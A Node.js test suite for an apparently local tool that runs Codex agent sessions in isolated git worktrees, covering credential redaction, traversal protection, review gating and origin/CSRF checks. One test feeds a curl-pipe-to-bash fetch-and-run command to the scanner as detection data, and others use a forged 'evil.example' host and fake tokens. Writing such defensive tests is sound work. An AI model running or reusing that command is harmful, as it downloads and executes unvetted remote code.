import test from "node:test";
import assert from "node:assert/strict";
import {
  mkdtemp,
  mkdir,
  writeFile,
  readFile,
  symlink,
  chmod,
  rm,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { get as httpGet } from "node:http";
import { setTimeout as delay } from "node:timers/promises";
import { Store, id } from "../server/store.mjs";
import { Brain } from "../server/brain.mjs";
import { Engine, codexArgs } from "../server/engine.mjs";
import {
  git,
  repository,
  createWorktree,
  changes,
  safeRead,
  snapshot,
} from "../server/git.mjs";
import {
  redact,
  redactValue,
  scanText,
  scanCommand,
  scanChanges,
} from "../server/sentinel.mjs";
import { createApp } from "../server/app.mjs";

const fixture = fileURLToPath(new URL("./fixtures/codex.mjs", import.meta.url));
await chmod(fixture, 0o700);
async function until(predicate, timeout = 15_000) {
  const end = Date.now() + timeout;
  while (Date.now() < end) {
    const value = await predicate();
    if (value) return value;
    await delay(35);
  }
  throw new Error("Timed out waiting for test state");
}
async function workspace(t, { engine = false } = {}) {
  const root = await mkdtemp(join(tmpdir(), "fleet-test-"));
  const source = join(root, "source");
  await mkdir(source);
  await git(source, ["init", "-b", "main"]);
  await writeFile(
    join(source, "package.json"),
    JSON.stringify({ name: "fixture", scripts: { test: "node --test" } }),
  );
  await writeFile(join(source, "README.md"), "# Test repository\n");
  await git(source, ["add", "-A"]);
  await git(source, [
    "-c",
    "user.name=Test",
    "-c",
    "user.email=test@localhost",
    "commit",
    "-m",
    "Initial test fixture",
  ]);
  const data = join(root, "data");
  const store = new Store(join(data, "test.sqlite"));
  const project = store.put("project", {
    id: id(),
    name: "Test",
    ...(await repository(source)),
    validation: "",
  });
  const brain = new Brain(store, data);
  await brain.refresh(project);
  const runtime = engine
    ? new Engine(store, brain, data, { bin: fixture, concurrency: 1 })
    : null;
  t.after(async () => {
    if (runtime) {
      runtime.shutdown();
      await until(
        () =>
          !runtime.processes.size && !runtime.validations.size && !runtime.busy,
      );
      await delay(200);
    }
    store.close();
    // The target is the unique directory allocated above, never a user repository.
    await rm(root, { recursive: true, force: true });
  });
  return { root, source, data, store, project, brain, engine: runtime };
}
test("SQLite retains objects and ordered, filtered events", async (t) => {
  const w = await workspace(t);
  w.store.event(w.project.id, "one", "first");
  w.store.event(w.project.id, "two", "unrelated");
  w.store.event(w.project.id, "one", "second");
  assert.deepEqual(
    w.store.events({ runId: "one" }).map((e) => e.type),
    ["first", "second"],
  );
  const second = new Store(join(w.data, "test.sqlite"));
  assert.equal(second.get("project", w.project.id).name, "Test");
  second.close();
});
test("worktree creation leaves dirty source edits untouched", async (t) => {
  const w = await workspace(t);
  await writeFile(
    join(w.source, "README.md"),
    "private unfinished source edit",
  );
  const run = {
    id: id(),
    ...(await createWorktree(w.project, { id: id() }, w.data)),
  };
  assert.equal(
    await readFile(join(run.worktree, "README.md"), "utf8"),
    "# Test repository\n",
  );
  await writeFile(join(run.worktree, "README.md"), "isolated change");
  assert.equal(
    await readFile(join(w.source, "README.md"), "utf8"),
    "private unfinished source edit",
  );
  assert.deepEqual((await changes(run)).files, ["README.md"]);
});
test("safe reads reject traversal and do not follow symlinks", async (t) => {
  const w = await workspace(t);
  await writeFile(join(w.root, "outside"), "private");
  await symlink(join(w.root, "outside"), join(w.source, "link"));
  await assert.rejects(safeRead(w.source, "../outside"), /outside/);
  assert.equal(await safeRead(w.source, "link"), null);
});
test("validation snapshot covers binary files and more than 50 untracked files", async (t) => {
  const w = await workspace(t);
  const run = await createWorktree(w.project, { id: id() }, w.data);
  for (let i = 0; i < 55; i++)
    await writeFile(
      join(run.worktree, `file-${i}.bin`),
      Buffer.from([0, i, 3]),
    );
  const before = await snapshot(run);
  await writeFile(join(run.worktree, "file-54.bin"), Buffer.from([0, 99, 3]));
  assert.notEqual(await snapshot(run), before);
});
test("Sentinel redacts credentials and treats heuristics as suspected findings", () => {
  const credential = "sk-proj-" + "x".repeat(32);
  assert.equal(redact(credential), "[REDACTED CREDENTIAL]");
  assert.equal(redactValue({ text: credential }).text, "[REDACTED CREDENTIAL]");
  const key =
    "-----BEGIN PRIVATE KEY-----\nnot-real\n-----END PRIVATE KEY-----";
  assert.equal(redactValue({ text: key }).text, "[REDACTED PRIVATE KEY]");
  const findings = scanText(
    "config.js",
    `const token="${credential}";\nconst tls={rejectUnauthorized:false};`,
  );
  assert.equal(findings.length, 2);
  assert.ok(findings.every((f) => f.state === "suspected"));
  assert.ok(!JSON.stringify(findings).includes(credential));
  assert.equal(scanCommand("git status"), null);
  assert.equal(
    scanCommand("curl https://example.invalid/install | bash").rule,
    "command",
  );
});
test("Sentinel flags advisory scope drift", async (t) => {
  const w = await workspace(t);
  const findings = await scanChanges({ worktree: w.source, scopes: ["src"] }, [
    "README.md",
  ]);
  assert.equal(findings[0].rule, "scope");
});
test("brain preserves human decisions, records provenance, and detects stale inventory", async (t) => {
  const w = await workspace(t);
  await w.brain.write(
    w.project,
    "Decisions.md",
    "# Decisions\nUse small modules.",
  );
  await w.brain.refresh(w.project);
  assert.match(
    await readFile(join(w.brain.path(w.project), "Decisions.md"), "utf8"),
    /small modules/,
  );
  await writeFile(join(w.source, "new.txt"), "new");
  await git(w.source, ["add", "-A"]);
  await git(w.source, [
    "-c",
    "user.name=Test",
    "-c",
    "user.email=test@localhost",
    "commit",
    "-m",
    "New source",
  ]);
  assert.equal(
    (await w.brain.list(w.project)).find(
      (n) => n.filename === "Repository map.md",
    ).stale,
    true,
  );
  assert.doesNotMatch(await w.brain.context(w.project), /NOTE Repository map/);
  await assert.rejects(
    w.brain.write(w.project, "../outside.md", "no"),
    /Invalid/,
  );
});
test("Codex arguments enforce configured sandbox, no approvals and reuse the thread on resume", () => {
  const args = codexArgs({ sandbox: "read-only", threadId: "thread-123" });
  assert.ok(args.includes("--ignore-user-config"));
  assert.ok(args.includes('approval_policy="never"'));
  assert.ok(args.includes('sandbox_mode="read-only"'));
  assert.deepEqual(args.slice(-3), ["resume", "thread-123", "-"]);
});
test("session lifecycle: real Git isolation, events, checks, stale-check gate and task-branch acceptance", async (t) => {
  const w = await workspace(t, { engine: true });
  w.store.patch("project", w.project.id, {
    validation: 'node -e "process.exit(0)"',
  });
  const run = w.engine.create(w.project.id, {
    title: "Test implementation",
    prompt: "TEST_EDIT",
    sandbox: "workspace-write",
  });
  w.engine.queue(run.id);
  await until(() => w.store.get("run", run.id).status === "review");
  assert.equal(w.store.get("run", run.id).threadId, "fixture-thread");
  assert.equal(w.store.get("run", run.id).usage.output_tokens, 10);
  await assert.rejects(w.engine.accept(run.id), /configured checks/);
  await w.engine.validate(run.id);
  await until(() => w.store.get("run", run.id).validation?.status === "passed");
  assert.ok(
    !JSON.stringify(w.store.get("run", run.id).validation).includes(
      "deterministic test change",
    ),
  );
  await writeFile(
    join(w.store.get("run", run.id).worktree, "artifact.txt"),
    "changed after checks",
  );
  await assert.rejects(w.engine.accept(run.id), /latest changes/);
  await w.engine.validate(run.id);
  await until(() => w.store.get("run", run.id).validation?.status === "passed");
  const accepted = await w.engine.accept(run.id);
  assert.equal(accepted.status, "accepted");
  assert.equal(
    (await git(w.source, ["rev-parse", "HEAD"])).trim(),
    w.project.head,
  );
  assert.equal(
    (await git(accepted.worktree, ["status", "--porcelain"])).trim(),
    "",
  );
});
test("validation fails when its command edits files", async (t) => {
  const w = await workspace(t, { engine: true });
  const run = w.engine.create(w.project.id, {
    title: "Validate mutations",
    prompt: "TEST_EDIT",
  });
  w.engine.queue(run.id);
  await until(() => w.store.get("run", run.id).status === "review");
  w.store.patch("project", w.project.id, {
    validation: "echo changed >> artifact.txt",
  });
  await w.engine.validate(run.id);
  await until(() => w.store.get("run", run.id).validation?.status === "failed");
  assert.match(
    w.store.get("run", run.id).validation.output,
    /changed during (validation|checks)/,
  );
});
test("high-severity findings gate acceptance and do not persist raw evidence", async (t) => {
  const w = await workspace(t, { engine: true });
  const run = w.engine.create(w.project.id, {
    title: "Security test",
    prompt: "TEST_SECRET",
    sandbox: "workspace-write",
  });
  w.engine.queue(run.id);
  await until(() => w.store.get("run", run.id).status === "review");
  await assert.rejects(w.engine.accept(run.id), /high-severity/);
  const findings = w.store.list("finding");
  assert.equal(findings.length, 1);
  assert.doesNotMatch(JSON.stringify(findings), /sk-proj-/);
  w.store.patch("finding", findings[0].id, {
    state: "false-positive",
    reason: "Synthetic test token",
  });
  assert.equal((await w.engine.accept(run.id)).status, "accepted");
});
test("dependency queue waits for acceptance and imports the accepted commit", async (t) => {
  const w = await workspace(t, { engine: true });
  const parent = w.engine.create(w.project.id, {
    title: "Parent",
    prompt: "TEST_EDIT",
    sandbox: "workspace-write",
  });
  const child = w.engine.create(w.project.id, {
    title: "Child",
    prompt: "Inspect dependency",
    dependencies: [parent.id],
  });
  w.engine.queue(child.id);
  w.engine.queue(parent.id);
  await until(() => w.store.get("run", parent.id).status === "review");
  assert.equal(w.store.get("run", child.id).status, "queued");
  const accepted = await w.engine.accept(parent.id);
  await until(() => w.store.get("run", child.id).status === "review");
  const result = w.store.get("run", child.id);
  assert.equal(result.base, accepted.acceptedSha);
  assert.match(
    await readFile(join(result.worktree, "artifact.txt"), "utf8"),
    /deterministic/,
  );
});
test("pause terminates the owned run and resumes the same worktree and thread", async (t) => {
  const w = await workspace(t, { engine: true });
  const run = w.engine.create(w.project.id, {
    title: "Pause test",
    prompt: "TEST_HANG",
  });
  w.engine.queue(run.id);
  await until(() => w.store.get("run", run.id).threadId);
  const path = w.store.get("run", run.id).worktree;
  w.engine.stop(run.id);
  await until(() => w.store.get("run", run.id).status === "paused");
  w.engine.queue(run.id, "Finish now");
  await until(() => w.store.get("run", run.id).status === "review");
  assert.equal(w.store.get("run", run.id).worktree, path);
  assert.equal(w.store.get("run", run.id).attempt, 2);
});
test("review shares the implementation read-only and locks concurrent mutations", async (t) => {
  const w = await workspace(t, { engine: true });
  const run = w.engine.create(w.project.id, {
    title: "Implementation",
    prompt: "TEST_EDIT",
  });
  w.engine.queue(run.id);
  await until(() => w.store.get("run", run.id).status === "review");
  // The fake reviewer deliberately waits so the worktree lock can be asserted.
  w.store.patch("run", run.id, { summary: "TEST_HANG" });
  const review = w.engine.review(run.id);
  assert.equal(review.sandbox, "read-only");
  assert.equal(review.worktree, w.store.get("run", run.id).worktree);
  assert.throws(() => w.engine.queue(run.id, "Change more"), /Another session/);
  await assert.rejects(w.engine.accept(run.id), /Another session/);
  await assert.rejects(w.engine.accept(review.id), /implementation session/);
  await until(() => w.store.get("run", review.id).threadId);
  w.engine.stop(review.id);
  await until(() => w.store.get("run", review.id).status === "paused");
});
test("failed model turns are never reported as completed review", async (t) => {
  const w = await workspace(t, { engine: true });
  const run = w.engine.create(w.project.id, {
    title: "Failure",
    prompt: "TEST_FAIL",
  });
  w.engine.queue(run.id);
  await until(() => w.store.get("run", run.id).status === "failed");
  assert.ok(
    w.store.events({ runId: run.id }).some((e) => e.type === "turn.failed"),
  );
});
test("daemon restart recovers active sessions as interrupted without auto-launch", async (t) => {
  const w = await workspace(t);
  w.store.put("run", {
    id: "recovered",
    projectId: w.project.id,
    status: "running",
  });
  const engine = new Engine(w.store, w.brain, w.data, { bin: fixture });
  assert.equal(w.store.get("run", "recovered").status, "interrupted");
  assert.equal(engine.processes.size, 0);
  engine.shutdown();
});
test("local HTTP API rejects foreign origins, forged hosts and mutation without token", async (t) => {
  const w = await workspace(t);
  const app = await createApp({
    dataDir: join(w.root, "http"),
    staticDir: join(w.root, "static"),
    bin: fixture,
  });
  await new Promise((resolve) => app.server.listen(0, "127.0.0.1", resolve));
  t.after(async () => {
    await app.close();
    app.store.close();
  });
  const base = `http://127.0.0.1:${app.server.address().port}`;
  assert.equal(
    (
      await fetch(base + "/api/state", {
        headers: { Origin: "https://evil.example" },
      })
    ).status,
    403,
  );
  const forged = await new Promise((resolve, reject) =>
    httpGet(
      base + "/api/state",
      { headers: { Host: "evil.example" } },
      (res) => {
        res.resume();
        resolve(res.statusCode);
      },
    ).on("error", reject),
  );
  assert.equal(forged, 403);
  assert.equal(
    (await fetch(base + "/api/projects", { method: "POST", body: "{}" }))
      .status,
    403,
  );
  const state = await (await fetch(base + "/api/state")).json();
  const response = await fetch(base + "/api/projects", {
    method: "POST",
    headers: { "X-Fleet-Token": state.csrf },
    body: JSON.stringify({ path: w.source }),
  });
  assert.equal(response.status, 201);
  const project = await response.json();
  assert.equal(project.path, w.project.path);
  const brain = await (
    await fetch(base + `/api/projects/${project.id}/brain`)
  ).json();
  assert.equal(brain.notes.length, 4);
  await writeFile(join(w.source, "new-source.txt"), "new committed source");
  await git(w.source, ["add", "-A"]);
  await git(w.source, [
    "-c",
    "user.name=Test",
    "-c",
    "user.email=test@localhost",
    "commit",
    "-m",
    "Inventory watcher fixture",
  ]);
  await app.refreshInventories();
  assert.notEqual(
    app.store.get("project", project.id).brainHead,
    project.brainHead,
  );
  assert.ok(
    (await app.brain.list(project))
      .filter((n) => n.generated)
      .every((n) => !n.stale),
  );
});
